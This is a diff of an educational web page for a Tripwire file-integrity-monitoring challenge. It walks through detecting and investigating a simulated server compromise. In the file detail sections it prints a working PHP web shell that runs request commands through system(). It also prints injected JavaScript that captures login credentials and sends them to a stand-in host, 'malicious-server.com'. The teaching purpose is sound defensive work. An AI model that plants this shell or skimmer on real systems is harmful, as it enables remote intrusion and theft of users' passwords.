+                                    Expected: 1 1177 100640 root shadow 1673 1617234567<br>
+                                    Observed: 1 1177 100777 root shadow 1673 1617284987<br>
+                                    <br>
+                                    ===============================================================================<br>
+                                    Object name: /var/www/html<br>
+                                    Property: Added: "/var/www/html/backdoor.php"<br>
+                                    <br>
+                                    ===============================================================================<br>
+                                    Object name: /var/www/html/index.html<br>
+                                    Property: Modified Object<br>
+                                    <br>
+                                    Expected: 1 1207 100644 www-data www-data 9172 1617234567<br>
+                                    Observed: 1 1406 100644 www-data www-data 9632 1617284987<br>
+                                    <br>
+                                    ===============================================================================<br>
+                                    <br>
+                                    Total objects scanned: 1548<br>
+                                    Total violations found: 4<br>
+                                    <br>
+                                    Report generated at: /var/lib/tripwire/report/localhost-20250402-134522.twr<br>
+                                </div>
+                            </div>
+                            <p style="margin-top: 15px;">Tripwire has successfully detected all the unauthorized
+                                changes!</p>
                         </div>
                     </div>
 
-                    <div class="file-details" id="passwd-details">
-                        <h4>File: /etc/passwd</h4>
-                        <p>This file contains user account information. The attacker has added a new root-level account.</p>
-
-                        <h5 style="margin-top: 15px;">Changes Detected:</h5>
-                        <ul style="margin-left: 20px;">
-                            <li><strong>Size:</strong> Increased from 4925 to 5015 bytes</li>
-                            <li><strong>Modification Time:</strong> Changed to Fri Apr 2 13:36:27 2025</li>
-                        </ul>
-
-                        <h5 style="margin-top: 15px;">Diff View:</h5>
-                        <div class="diff-view">
-                            <div class="diff-line diff-added">+ malicious_user:x:0:0:Malicious User:/home/malicious_user:/bin/bash</div>
+                    <div class="task-item">
+                        <div class="task-number">3</div>
+                        <div class="task-content">
+                            <h4>Generate a Detailed Report</h4>
+                            <p>Let's generate a more detailed report to better understand the changes:</p>
+                            <div class="terminal-header">
+                                <div class="terminal-controls">
+                                    <span class="terminal-close"></span>
+                                    <span class="terminal-minimize"></span>
+                                    <span class="terminal-maximize"></span>
+                                </div>
+                                <span>Terminal</span>
+                            </div>
+                            <div class="terminal">
+                                <div>server@ubuntu:~$ <span style="color: #63E2FF;">sudo twprint --twrfile /var/lib/tripwire/report/localhost-20250402-134522.twr --report-level 3</span>
+                                </div>
+                                <div style="color: #ABABAB; margin-top: 10px;">
+                                    Tripwire(R) 2.4.3.7 Integrity Check Report<br>
+                                    <br>
+                                    Report generated by: root<br>
+                                    Report created on: Wed Apr 2 13:45:22 2025<br>
+                                    Database last updated on: Wed Apr 1 12:15:30 2025<br>
+                                    <br>
+                                    ===============================================================================<br>
+                                    Rule Summary:<br>
+                                    -------------------------------------------------------------------------------<br>
+                                    Section: Unix File System<br>
+                                    <br>
+                                    Rule Name Severity Level Added Removed Modified<br>
+                                    -------------------------------------------------------------------------------<br>
+                                    Critical system configuration 100 0 0 2<br>
+                                    Web server files 100 1 0 1<br>
+                                    <br>
+                                    ===============================================================================<br>
+                                    Object Summary:<br>
+                                    -------------------------------------------------------------------------------<br>
+                                    # Section: Unix File System<br>
+                                    <br>
+                                    Added Objects: 1<br>
+                                    -------------------------------------------------------------------------------<br>
+                                    1. /var/www/html/backdoor.php<br>
+                                    <br>
+                                    <br>
+                                    Modified Objects: 3<br>
+                                    -------------------------------------------------------------------------------<br>
+                                    1. /etc/passwd<br>
+                                    Observed: Size, Modify time<br>
+                                    <br>
+                                    2. /etc/shadow<br>
+                                    Observed: Mode, Modify time<br>
+                                    <br>
+                                    3. /var/www/html/index.html<br>
+                                    Observed: Size, Modify time<br>
+                                    <br>
+                                    ===============================================================================<br>
+                                    Object Details:<br>
+                                    -------------------------------------------------------------------------------<br>
+                                    <br>
+                                    #1: Object name: /etc/passwd<br>
+                                    Property: Modified Object<br>
+                                    <br>
+                                    Property: Size<br>
+                                    Expected: 4925<br>
+                                    Observed: 5015<br>
+                                    <br>
+                                    Property: Modify Time<br>
+                                    Expected: Thu Apr 1 12:02:47 2025<br>
+                                    Observed: Fri Apr 2 13:36:27 2025<br>
+                                    <br>
+                                    #2: Object name: /etc/shadow<br>
+                                    Property: Modified Object<br>
+                                    <br>
+                                    Property: Mode<br>
+                                    Expected: -rw-r-----<br>
+                                    Observed: -rwxrwxrwx<br>
+                                    <br>
+                                    Property: Modify Time<br>
+                                    Expected: Thu Apr 1 12:02:47 2025<br>
+                                    Observed: Fri Apr 2 13:37:08 2025<br>
+                                    <br>
+                                    #3: Object name: /var/www/html<br>
+                                    Property: Added: "/var/www/html/backdoor.php"<br>
+                                    <br>
+                                    #4: Object name: /var/www/html/index.html<br>
+                                    Property: Modified Object<br>
+                                    <br>
+                                    Property: Size<br>
+                                    Expected: 9172<br>
+                                    Observed: 9632<br>
+                                    <br>
+                                    Property: Modify Time<br>
+                                    Expected: Thu Apr 1 11:30:00 2025<br>
+                                    Observed: Fri Apr 2 13:38:47 2025<br>
+                                    <br>
+                                    ===============================================================================<br>
+                                    Error Report:<br>
+                                    -------------------------------------------------------------------------------<br>
+                                    No Errors<br>
+                                    <br>
+                                    ===============================================================================<br>
+                                </div>
+                            </div>
                         </div>
-
-                        <h5 style="margin-top: 15px;">Security Impact:</h5>
-                        <p>High severity. The attacker has created a new account with root privileges (UID 0), allowing complete administrative access to the system.</p>
-                    </div>
-
-                    <div class="file-details" id="shadow-details">
-                        <h4>File: /etc/shadow</h4>
-                        <p>This file contains encrypted password hashes for user accounts. The attacker has changed its permissions.</p>
-
-                        <h5 style="margin-top: 15px;">Changes Detected:</h5>
-                        <ul style="margin-left: 20px;">
-                            <li><strong>Permissions:</strong> Changed from 640 (rw-r-----) to 777 (rwxrwxrwx)</li>
-                            <li><strong>Modification Time:</strong> Changed to Fri Apr 2 13:37:08 2025</li>
-                        </ul>
-
-                        <h5 style="margin-top: 15px;">Security Impact:</h5>
-                        <p>High severity. By changing the permissions to world-readable and writable, any user on the system can read or modify password hashes. This could lead to password cracking or unauthorized password changes.</p>
-                    </div>
-
-                    <div class="file-details" id="backdoor-details">
-                        <h4>File: /var/www/html/backdoor.php</h4>
-                        <p>This is a new file added by the attacker that allows remote command execution on the server.</p>
-
-                        <h5 style="margin-top: 15px;">Changes Detected:</h5>
-                        <ul style="margin-left: 20px;">
-                            <li><strong>File Added:</strong> New file detected in monitored directory</li>
-                        </ul>
-
-                        <h5 style="margin-top: 15px;">File Content:</h5>
-                        <div class="code-block">
-<?php
-if(isset($_REQUEST['cmd'])) {
-    echo '<pre>';
-    $cmd = ($_REQUEST['cmd']);
-    system($cmd);
-    echo '</pre>';
-}
-?>
-                        </div>
-
-                        <h5 style="margin-top: 15px;">Security Impact:</h5>
-                        <p>Critical severity. This PHP script creates a web shell that allows the attacker to execute arbitrary commands on the server with the permissions of the web server user.</p>
-                    </div>
-
-                    <div class="file-details" id="index-details">
-                        <h4>File: /var/www/html/index.html</h4>
-                        <p>The main website page has been modified to include malicious JavaScript code.</p>
-
-                        <h5 style="margin-top: 15px;">Changes Detected:</h5>
-                        <ul style="margin-left: 20px;">
-                            <li><strong>Size:</strong> Increased from 9172 to 9632 bytes</li>
-                            <li><strong>Modification Time:</strong> Changed to Fri Apr 2 13:38:47 2025</li>
-                        </ul>
-
-                        <h5 style="margin-top: 15px;">Added Code:</h5>
-                        <div class="diff-view">
-                            <div class="diff-line diff-added">+ <script></div>
-                            <div class="diff-line diff-added">+ document.addEventListener('DOMContentLoaded', function() {</div>
-                            <div class="diff-line diff-added">+     // Hidden code to steal login credentials</div>
-                            <div class="diff-line diff-added">+     document.querySelector('form').addEventListener('submit', function(e) {</div>
-                            <div class="diff-line diff-added">+         var username = document.getElementById('username').value;</div>
-                            <div class="diff-line diff-added">+         var password = document.getElementById('password').value;</div>
-                            <div class="diff-line diff-added">+         var img = new Image();</div>
-                            <div class="diff-line diff-added">+         img.src = 'https://malicious-server.com/collect.php?u=' + encodeURIComponent(username) + '&p=' + encodeURIComponent(password);</div>
-                            <div class="diff-line diff-added">+     });</div>
-                            <div class="diff-line diff-added">+ });</div>
-                            <div class="diff-line diff-added">+ </script></div>
-                        </div>
-
-                        <h5 style="margin-top: 15px;">Security Impact:</h5>
-                        <p>High severity. The attacker has added JavaScript code that steals user credentials when they log in to the website and sends them to a malicious server.</p>
-                    </div>
-
-                    <div style="margin-top: 30px; text-align: center;">
-                        <button class="btn btn-primary" onclick="completeDetection()">Complete Change Detection</button>
                     </div>
                 </div>
 
-                <!-- Investigation Tab -->
-                <div class="challenge-container" id="investigation">
-                    <h3 style="margin-bottom: 20px;">Investigating the Incident</h3>
-
-                    <p>Now that we've detected unauthorized changes to our system files, we need to investigate the incident to understand its scope and impact.</p>
-
-                    <div class="task-list">
-                        <div class="task-item">
-                            <div class="task-number">1</div>
-                            <div class="task-content">
-                                <h4>Review All File Changes</h4>
-                                <p>Let's summarize the unauthorized changes detected by Tripwire:</p>
-
-                                <table class="hash-table">
-                                    <thead>
-                                        <tr>
-                                            <th>File</th>
-                                            <th>Change Type</th>
-                                            <th>Details</th>
-                                            <th>Security Impact</th>
-                                        </tr>
-                                    </thead>
-                                    <tbody>
-                                        <tr class="changed">
-                                            <td>/etc/passwd</td>
-                                            <td>Modified</td>
-                                            <td>Added root-level user account</td>
-                                            <td>Critical - Unauthorized root access</td>
-                                        </tr>
-                                        <tr class="changed">
-                                            <td>/etc/shadow</td>
-                                            <td>Permission Change</td>
-                                            <td>Changed from 640 to 777</td>
-                                            <td>Critical - Password hash exposure</td>
-                                        </tr>
-                                        <tr class="changed">
-                                            <td>/var/www/html/backdoor.php</td>
-                                            <td>New File</td>
-                                            <td>Web shell for command execution</td>
-                                            <td>Critical - Remote code execution</td>
-                                        </tr>
-                                        <tr class="changed">
-                                            <td>/var/www/html/index.html</td>
-                                            <td>Modified</td>
-                                            <td>Added malicious JavaScript</td>
-                                            <td>High - Credential theft</td>
-                                        </tr>
-                                    </tbody>
-                                </table>
-                            </div>
-                        </div>
-
-                        <div class="task-item">
-                            <div class="task-number">2</div>
-                            <div class="task-content">
-                                <h4>Determine Attack Timeline</h4>
-                                <p>Based on the Tripwire report, all file modifications occurred on Friday, April 2, 2025, between 13:36 and 13:38. This suggests a coordinated attack rather than random system changes.</p>
-
-                                <p>The attack sequence appears to be:</p>
-                                <ol style="margin-left: 20px;">
-                                    <li>Added a backdoor user account to /etc/passwd (13:36)</li>
-                                    <li>Made /etc/shadow world-readable/writable (13:37)</li>
-                                    <li>Added a web shell backdoor.php (timestamp manipulated)</li>
-                                    <li>Modified index.html to add credential stealing code (13:38)</li>
-                                </ol>
-                            </div>
-                        </div>
-
-                        <div class="task-item">
-                            <div class="task-number">3</div>
-                            <div class="task-content">
-                                <h4>Assess Security Impact</h4>
-                                <p>This appears to be a sophisticated attack with multiple components:</p>
-
-                                <ul style="margin-left: 20px;">
-                                    <li><strong>Persistence</strong>: The attacker created a root-level user account to maintain access even if other backdoors are discovered</li>
-                                    <li><strong>Privilege Escalation</strong>: By making /etc/shadow world-writable, they could modify any user's password</li>
-                                    <li><strong>Remote Access</strong>: The PHP web shell provides command execution capabilities</li>
-                                    <li><strong>Data Theft</strong>: The JavaScript code steals user credentials</li>
-                                    <li><strong>Anti-Forensics</strong>: Attempted to hide the backdoor by modifying timestamps</li>
-                                </ul>
-
-                                <p>This combination suggests a targeted attack aimed at maintaining long-term access to the system and stealing sensitive information.</p>
-                            </div>
-                        </div>
-
-                        <div class="task-item">
-                            <div class="task-number">4</div>
-                            <div class="task-content">
-                                <h4>Remediation Plan</h4>
-                                <p>Based on our investigation, here's a remediation plan to address the compromise:</p>
-
-                                <ol style="margin-left: 20px;">
-                                    <li><strong>Immediate Actions:</strong>
-                                        <ul>
-                                            <li>Remove the malicious user account from /etc/passwd</li>
-                                            <li>Restore proper permissions (640) on /etc/shadow</li>
-                                            <li>Remove the backdoor.php file</li>
-                                            <li>Remove the malicious JavaScript from index.html</li>
-                                        </ul>
-                                    </li>
-                                    <li><strong>Additional Security Measures:</strong>
-                                        <ul>
-                                            <li>Change all system passwords</li>
-                                            <li>Check for additional backdoors or modified files</li>
-                                            <li>Investigate how the attacker gained initial access</li>
-                                            <li>Enhance monitoring and alerting</li>
-                                        </ul>
-                                    </li>
-                                    <li><strong>Long-term Improvements:</strong>
-                                        <ul>
-                                            <li>Implement more comprehensive file integrity monitoring</li>
-                                            <li>Set up real-time alerting for critical file changes</li>
-                                            <li>Deploy additional security controls (WAF, HIDS, etc.)</li>
-                                            <li>Conduct security awareness training</li>
-                                        </ul>
-                                    </li>
-                                </ol>
-                            </div>
-                        </div>
+                <div class="file-grid">
+                    <div class="file-item modified" onclick="showFileDetails('passwd')">
+                        <i class="fas fa-file-alt"></i>
+                        <span>/etc/passwd</span>
                     </div>
-
-                    <div class="info-box">
-                        <h4><i class="fas fa-info-circle"></i> Best Practices for File Integrity Monitoring</h4>
-                        <p>Based on this incident, here are some recommendations for effective file integrity monitoring:</p>
-                        <ol style="margin-top: 10px; margin-left: 20px;">
-                            <li><strong>Monitor the Right Files</strong>: Focus on critical system files, configuration files, and application code</li>
-                            <li><strong>Regular Checks</strong>: Run scheduled checks at least daily, with real-time monitoring for critical files</li>
-                            <li><strong>Secure Baseline Database</strong>: Store the baseline database on read-only media or a separate secure system</li>
-                            <li><strong>Change Management</strong>: Update the baseline after legitimate changes to reduce false positives</li>
-                            <li><strong>Alert Integration</strong>: Integrate FIM alerts with your SIEM or security monitoring system</li>
-                            <li><strong>Policy Refinement</strong>: Regularly review and update the monitoring policy</li>
-                        </ol>
+                    <div class="file-item modified" onclick="showFileDetails('shadow')">
+                        <i class="fas fa-file-shield"></i>
+                        <span>/etc/shadow</span>
                     </div>
-
-                    <div style="margin-top: 30px; text-align: center;">
-                        <button class="btn btn-primary" onclick="completeInvestigation()">Complete Investigation</button>
+                    <div class="file-item modified" onclick="showFileDetails('backdoor')">
+                        <i class="fas fa-file-code"></i>
+                        <span>backdoor.php</span>
+                    </div>
+                    <div class="file-item modified" onclick="showFileDetails('index')">
+                        <i class="fas fa-file-code"></i>
+                        <span>index.html</span>
                     </div>
                 </div>
 
-                <!-- Completion Tab -->
-                <div class="challenge-container" id="completion">
-                    <h3 style="margin-bottom: 20px;">Challenge Completion</h3>
+                <div class="file-details" id="passwd-details">
+                    <h4>File: /etc/passwd</h4>
+                    <p>This file contains user account information. The attacker has added a new root-level account.</p>
 
-                    <p>Congratulations! You have successfully completed the File Integrity Monitoring Challenge. You've learned how to:</p>
-
-                    <ul style="margin: 20px 0 20px 20px;">
-                        <li>Install and configure Tripwire for file integrity monitoring</li>
-                        <li>Create a baseline of critical system files</li>
-                        <li>Detect unauthorized changes to monitored files</li>
-                        <li>Investigate security incidents using FIM data</li>
-                        <li>Develop remediation plans to address security breaches</li>
+                    <h5 style="margin-top: 15px;">Changes Detected:</h5>
+                    <ul style="margin-left: 20px;">
+                        <li><strong>Size:</strong> Increased from 4925 to 5015 bytes</li>
+                        <li><strong>Modification Time:</strong> Changed to Fri Apr 2 13:36:27 2025</li>
                     </ul>
 
-                    <p>File integrity monitoring is a critical security control that can help organizations detect unauthorized changes to important files and respond quickly to potential security incidents.</p>
+                    <h5 style="margin-top: 15px;">Diff View:</h5>
+                    <div class="diff-view">
+                        <div class="diff-line diff-added">+ malicious_user:x:0:0:Malicious
+                            User:/home/malicious_user:/bin/bash
+                        </div>
+                    </div>
 
-                    <div class="certificate-container">
-                        <div class="certificate">
-                            <div class="certificate-content">
-                                <h2 style="font-size: 36px; margin-bottom: 30px; color: var(--primary-color);">Certificate of Completion</h2>
-                                <h3 style="font-size: 24px; margin-bottom: 10px; color: var(--secondary-color);">File Integrity Monitoring Challenge</h3>
-                                <p style="font-size: 18px; margin-bottom: 40px;">This certificate is awarded to</p>
+                    <h5 style="margin-top: 15px;">Security Impact:</h5>
+                    <p>High severity. The attacker has created a new account with root privileges (UID 0), allowing
+                        complete administrative access to the system.</p>
+                </div>
 
-                                <h4 style="font-size: 28px; font-weight: bold; margin-bottom: 40px; color: var(--primary-color);">[Your Name Here]</h4>
+                <div class="file-details" id="shadow-details">
+                    <h4>File: /etc/shadow</h4>
+                    <p>This file contains encrypted password hashes for user accounts. The attacker has changed its
+                        permissions.</p>
 
-                                <p style="font-size: 18px; margin-bottom: 30px;">For successfully completing the File Integrity Monitoring Challenge and demonstrating proficiency in detecting and investigating unauthorized system changes.</p>
+                    <h5 style="margin-top: 15px;">Changes Detected:</h5>
+                    <ul style="margin-left: 20px;">
+                        <li><strong>Permissions:</strong> Changed from 640 (rw-r-----) to 777 (rwxrwxrwx)</li>
+                        <li><strong>Modification Time:</strong> Changed to Fri Apr 2 13:37:08 2025</li>
+                    </ul>
 
-                                <div style="display: flex; justify-content: space-between; margin-top: 60px;">
-                                    <div style="text-align: center; border-top: 1px solid #dee2e6; padding-top: 10px; width: 200px;">
-                                        <p>Aziz Alghamdi</p>
-                                        <p style="font-size: 14px; color: var(--secondary-color);">Instructor</p>
-                                    </div>
-                                    <div style="text-align: center; border-top: 1px solid #dee2e6; padding-top: 10px; width: 200px;">
-                                        <p>May 1, 2025</p>
-                                        <p style="font-size: 14px; color: var(--secondary-color);">Date</p>
-                                    </div>
+                    <h5 style="margin-top: 15px;">Security Impact:</h5>
+                    <p>High severity. By changing the permissions to world-readable and writable, any user on the system
+                        can read or modify password hashes. This could lead to password cracking or unauthorized
+                        password changes.</p>
+                </div>
+
+                <div class="file-details" id="backdoor-details">
+                    <h4>File: /var/www/html/backdoor.php</h4>
+                    <p>This is a new file added by the attacker that allows remote command execution on the server.</p>
+
+                    <h5 style="margin-top: 15px;">Changes Detected:</h5>
+                    <ul style="margin-left: 20px;">
+                        <li><strong>File Added:</strong> New file detected in monitored directory</li>
+                    </ul>
+
+                    <h5 style="margin-top: 15px;">File Content:</h5>
+                    <div class="code-block">
+                        <?php
+if(isset($_REQUEST['cmd'])) {
+    echo '<pre>';
+                        $cmd = ($_REQUEST['cmd']);
+                        system($cmd);
+                        echo '</pre>';
+                        }
+                        ?>
+                    </div>
+
+                    <h5 style="margin-top: 15px;">Security Impact:</h5>
+                    <p>Critical severity. This PHP script creates a web shell that allows the attacker to execute
+                        arbitrary commands on the server with the permissions of the web server user.</p>
+                </div>
+
+                <div class="file-details" id="index-details">
+                    <h4>File: /var/www/html/index.html</h4>
+                    <p>The main website page has been modified to include malicious JavaScript code.</p>
+
+                    <h5 style="margin-top: 15px;">Changes Detected:</h5>
+                    <ul style="margin-left: 20px;">
+                        <li><strong>Size:</strong> Increased from 9172 to 9632 bytes</li>
+                        <li><strong>Modification Time:</strong> Changed to Fri Apr 2 13:38:47 2025</li>
+                    </ul>
+
+                    <h5 style="margin-top: 15px;">Added Code:</h5>
+                    <div class="diff-view">
+                      <pre class="diff-line diff-added">
+                    + &lt;script&gt;
+                    + document.addEventListener('DOMContentLoaded', function() {
+                    +     // Hidden code to steal login credentials
+                    +     document.querySelector('form').addEventListener('submit', function(e) {
+                    +         var username = document.getElementById('username').value;
+                    +         var password = document.getElementById('password').value;
+                    +         var img = new Image();
+                    +         img.src = 'https://malicious-server.com/collect.php?u=' + encodeURIComponent(username) + '&p=' + encodeURIComponent(password);
+                    +     });
+                    + });
+                    + &lt;/script&gt;
+                      </pre>
+                    </div>
+
+
+                    <h5 style="margin-top: 15px;">Security Impact:</h5>
+                    <p>High severity. The attacker has added JavaScript code that steals user credentials when they log
+                        in to the website and sends them to a malicious server.</p>
+                </div>
+
+                <div style="margin-top: 30px; text-align: center;">
+                    <button class="btn btn-primary" onclick="completeDetection()">Complete Change Detection</button>
+                </div>
+            </div>
+
+            <!-- Investigation Tab -->
+            <div class="challenge-container" id="investigation">
+                <h3 style="margin-bottom: 20px;">Investigating the Incident</h3>
+
+                <p>Now that we've detected unauthorized changes to our system files, we need to investigate the incident
+                    to understand its scope and impact.</p>
+
+                <div class="task-list">
+                    <div class="task-item">
+                        <div class="task-number">1</div>
+                        <div class="task-content">
+                            <h4>Review All File Changes</h4>
+                            <p>Let's summarize the unauthorized changes detected by Tripwire:</p>
+
+                            <table class="hash-table">
+                                <thead>
+                                <tr>
+                                    <th>File</th>
+                                    <th>Change Type</th>
+                                    <th>Details</th>
+                                    <th>Security Impact</th>
+                                </tr>
+                                </thead>
+                                <tbody>
+                                <tr class="changed">
+                                    <td>/etc/passwd</td>
+                                    <td>Modified</td>
+                                    <td>Added root-level user account</td>
+                                    <td>Critical - Unauthorized root access</td>
+                                </tr>
+                                <tr class="changed">
+                                    <td>/etc/shadow</td>
+                                    <td>Permission Change</td>
+                                    <td>Changed from 640 to 777</td>
+                                    <td>Critical - Password hash exposure</td>
+                                </tr>
+                                <tr class="changed">
+                                    <td>/var/www/html/backdoor.php</td>
+                                    <td>New File</td>
+                                    <td>Web shell for command execution</td>
+                                    <td>Critical - Remote code execution</td>
+                                </tr>
+                                <tr class="changed">
+                                    <td>/var/www/html/index.html</td>
+                                    <td>Modified</td>
+                                    <td>Added malicious JavaScript</td>
+                                    <td>High - Credential theft</td>
+                                </tr>
+                                </tbody>
+                            </table>
+                        </div>
+                    </div>
+
+                    <div class="task-item">
+                        <div class="task-number">2</div>
+                        <div class="task-content">
+                            <h4>Determine Attack Timeline</h4>
+                            <p>Based on the Tripwire report, all file modifications occurred on Friday, April 2, 2025,
+                                between 13:36 and 13:38. This suggests a coordinated attack rather than random system
+                                changes.</p>
+
+                            <p>The attack sequence appears to be:</p>
+                            <ol style="margin-left: 20px;">
+                                <li>Added a backdoor user account to /etc/passwd (13:36)</li>
+                                <li>Made /etc/shadow world-readable/writable (13:37)</li>
+                                <li>Added a web shell backdoor.php (timestamp manipulated)</li>
+                                <li>Modified index.html to add credential stealing code (13:38)</li>
+                            </ol>
+                        </div>
+                    </div>
+
+                    <div class="task-item">
+                        <div class="task-number">3</div>
+                        <div class="task-content">
+                            <h4>Assess Security Impact</h4>
+                            <p>This appears to be a sophisticated attack with multiple components:</p>
+
+                            <ul style="margin-left: 20px;">
+                                <li><strong>Persistence</strong>: The attacker created a root-level user account to
+                                    maintain access even if other backdoors are discovered
+                                </li>
+                                <li><strong>Privilege Escalation</strong>: By making /etc/shadow world-writable, they
+                                    could modify any user's password
+                                </li>
+                                <li><strong>Remote Access</strong>: The PHP web shell provides command execution
+                                    capabilities
+                                </li>
+                                <li><strong>Data Theft</strong>: The JavaScript code steals user credentials</li>
+                                <li><strong>Anti-Forensics</strong>: Attempted to hide the backdoor by modifying
+                                    timestamps
+                                </li>
+                            </ul>
+
+                            <p>This combination suggests a targeted attack aimed at maintaining long-term access to the
+                                system and stealing sensitive information.</p>
+                        </div>
+                    </div>
+
+                    <div class="task-item">
+                        <div class="task-number">4</div>
+                        <div class="task-content">
+                            <h4>Remediation Plan</h4>
+                            <p>Based on our investigation, here's a remediation plan to address the compromise:</p>
+
+                            <ol style="margin-left: 20px;">
+                                <li><strong>Immediate Actions:</strong>
+                                    <ul>
+                                        <li>Remove the malicious user account from /etc/passwd</li>
+                                        <li>Restore proper permissions (640) on /etc/shadow</li>
+                                        <li>Remove the backdoor.php file</li>
+                                        <li>Remove the malicious JavaScript from index.html</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Additional Security Measures:</strong>
+                                    <ul>
+                                        <li>Change all system passwords</li>
+                                        <li>Check for additional backdoors or modified files</li>
+                                        <li>Investigate how the attacker gained initial access</li>
+                                        <li>Enhance monitoring and alerting</li>
+                                    </ul>
+                                </li>
+                                <li><strong>Long-term Improvements:</strong>
+                                    <ul>
+                                        <li>Implement more comprehensive file integrity monitoring</li>
+                                        <li>Set up real-time alerting for critical file changes</li>
+                                        <li>Deploy additional security controls (WAF, HIDS, etc.)</li>
+                                        <li>Conduct security awareness training</li>
+                                    </ul>
+                                </li>
+                            </ol>
+                        </div>
+                    </div>
+                </div>
+
+                <div class="info-box">
+                    <h4><i class="fas fa-info-circle"></i> Best Practices for File Integrity Monitoring</h4>
+                    <p>Based on this incident, here are some recommendations for effective file integrity
+                        monitoring:</p>
+                    <ol style="margin-top: 10px; margin-left: 20px;">
+                        <li><strong>Monitor the Right Files</strong>: Focus on critical system files, configuration
+                            files, and application code
+                        </li>
+                        <li><strong>Regular Checks</strong>: Run scheduled checks at least daily, with real-time
+                            monitoring for critical files
+                        </li>
+                        <li><strong>Secure Baseline Database</strong>: Store the baseline database on read-only media or
+                            a separate secure system
+                        </li>
+                        <li><strong>Change Management</strong>: Update the baseline after legitimate changes to reduce
+                            false positives
+                        </li>
+                        <li><strong>Alert Integration</strong>: Integrate FIM alerts with your SIEM or security
+                            monitoring system
+                        </li>
+                        <li><strong>Policy Refinement</strong>: Regularly review and update the monitoring policy</li>
+                    </ol>
+                </div>
+
+                <div style="margin-top: 30px; text-align: center;">
+                    <button class="btn btn-primary" onclick="completeInvestigation()">Complete Investigation</button>
+                </div>
+            </div>
+
+            <!-- Completion Tab -->
+            <div class="challenge-container" id="completion">
+                <h3 style="margin-bottom: 20px;">Challenge Completion</h3>
+
+                <p>Congratulations! You have successfully completed the File Integrity Monitoring Challenge. You've
+                    learned how to:</p>
+
+                <ul style="margin: 20px 0 20px 20px;">
+                    <li>Install and configure Tripwire for file integrity monitoring</li>
+                    <li>Create a baseline of critical system files</li>
+                    <li>Detect unauthorized changes to monitored files</li>
+                    <li>Investigate security incidents using FIM data</li>
+                    <li>Develop remediation plans to address security breaches</li>
+                </ul>
+
+                <p>File integrity monitoring is a critical security control that can help organizations detect
+                    unauthorized changes to important files and respond quickly to potential security incidents.</p>
+
+                <div class="certificate-container">
+                    <div class="certificate">
+                        <div class="certificate-content">
+                            <h2 style="font-size: 36px; margin-bottom: 30px; color: var(--primary-color);">Certificate
+                                of Completion</h2>
+                            <h3 style="font-size: 24px; margin-bottom: 10px; color: var(--secondary-color);">File
+                                Integrity Monitoring Challenge</h3>
+                            <p style="font-size: 18px; margin-bottom: 40px;">This certificate is awarded to</p>
+
+                            <h4 style="font-size: 28px; font-weight: bold; margin-bottom: 40px; color: var(--primary-color);">
+                                [Your Name Here]</h4>
+
+                            <p style="font-size: 18px; margin-bottom: 30px;">For successfully completing the File
+                                Integrity Monitoring Challenge and demonstrating proficiency in detecting and
+                                investigating unauthorized system changes.</p>
+
+                            <div style="display: flex; justify-content: space-between; margin-top: 60px;">
+                                <div style="text-align: center; border-top: 1px solid #dee2e6; padding-top: 10px; width: 200px;">
+                                    <p>Aziz Alghamdi</p>
+                                    <p style="font-size: 14px; color: var(--secondary-color);">Instructor</p>
+                                </div>
+                                <div style="text-align: center; border-top: 1px solid #dee2e6; padding-top: 10px; width: 200px;">
+                                    <p>May 1, 2025</p>
+                                    <p style="font-size: 14px; color: var(--secondary-color);">Date</p>
                                 </div>
                             </div>
-                            <div class="certificate-seal">
-                                <i class="fas fa-shield-alt"></i>
-                            </div>
                         </div>
-
-                        <div style="margin-top: 30px;">
-                            <a href="#" class="btn btn-primary" style="margin-right: 15px;">
-                                <i class="fas fa-download" style="margin-right: 8px;"></i> Download Certificate
-                            </a>
-                            <a href="#" class="btn btn-primary">
-                                <i class="fas fa-share-alt" style="margin-right: 8px;"></i> Share Certificate
-                            </a>
+                        <div class="certificate-seal">
+                            <i class="fas fa-shield-alt"></i>
                         </div>
                     </div>
 
-                    <div style="margin-top: 30px; text-align: center;">
-                        <a href="interactive-section.html" class="btn btn-success">Return to Interactive Learning</a>
+                    <div style="margin-top: 30px;">
+                        <a href="#" class="btn btn-primary" style="margin-right: 15px;">
+                            <i class="fas fa-download" style="margin-right: 8px;"></i> Download Certificate
+                        </a>
+                        <a href="#" class="btn btn-primary">
+                            <i class="fas fa-share-alt" style="margin-right: 8px;"></i> Share Certificate
+                        </a>
                     </div>
+                </div>
+
+                <div style="margin-top: 30px; text-align: center;">
+                    <a href="interactive-section.html" class="btn btn-success">Return to Interactive Learning</a>
                 </div>
             </div>
         </div>
-    </section>
+    </div>
+</section>
 
-    <!-- Footer -->
-    <footer>
-        <div class="container">
-            <p>&copy; 2025 Aziz Alghamdi. All Rights Reserved.</p>
-            <p>Return to <a href="index.html">Home</a> or <a href="interactive-section.html">Interactive Learning</a></p>
-        </div>
-    </footer>
+<!-- Footer -->
+<footer>
+    <div class="container">
+        <p>&copy; 2025 Aziz Alghamdi. All Rights Reserved.</p>
+        <p>Return to <a href="index.html">Home</a> or <a href="interactive-section.html">Interactive Learning</a></p>
+    </div>
+</footer>
 
-    <!-- JavaScript -->
+<!-- JavaScript -->
 <script src="/Interactive_Section/javascript/fim-challenge.js"></script>
 <script src="/Interactive_Section/javascript/cyber-vis.js"></script>
 </body>
